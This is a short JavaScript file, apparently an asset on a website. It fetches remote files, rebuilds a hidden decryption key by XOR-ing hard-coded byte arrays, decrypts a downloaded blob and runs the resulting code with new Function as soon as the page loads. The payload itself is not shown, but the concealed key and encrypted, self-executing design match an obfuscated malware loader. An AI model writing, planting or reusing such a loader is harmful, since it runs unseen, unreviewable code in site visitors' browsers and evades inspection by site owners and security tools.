(async function(){
  try {
    var s=document.currentScript;
    var base=s?s.src.replace(/[^\/]+$/,''):'/sites/eplusjp/assets/';
    var gr=await fetch(base+'f47d393780bb85c1.js');
    var gc=await gr.text();
    var E={};(new Function('exports','fetch',gc))(E,fetch);
    await E.default({module_or_path:base+'877049c68d85281f'});
    var pr=await fetch(base+'6b59aa29676a2bba');
    var pb=new Uint8Array(await pr.arrayBuffer());
    var iv=pb.slice(0,12),tg=pb.slice(12,28),ct=pb.slice(28);
    var cwt=new Uint8Array(ct.length+16);cwt.set(ct);cwt.set(tg,ct.length);
    var _m=[[51,213,236,94],[40,97,38,166],[231,177,201,115],[195,45,138,152]];
    var _f=[[59,216,193,57],[187,226,128,163],[191,178,29,183],[11,92,153,217]];
    var _o=[0,1,2,3];
    var kpb=new Uint8Array(16);
    for(var i=0;i<4;i++){var idx=_o[i];for(var j=0;j<4;j++)kpb[i*4+j]=_f[idx][j]^_m[idx][j]}
    var plain=E.decode(cwt,kpb,iv);
    var code=new TextDecoder().decode(plain);
    (new Function(code))();
  }catch(e){console.error('init',e)}
})();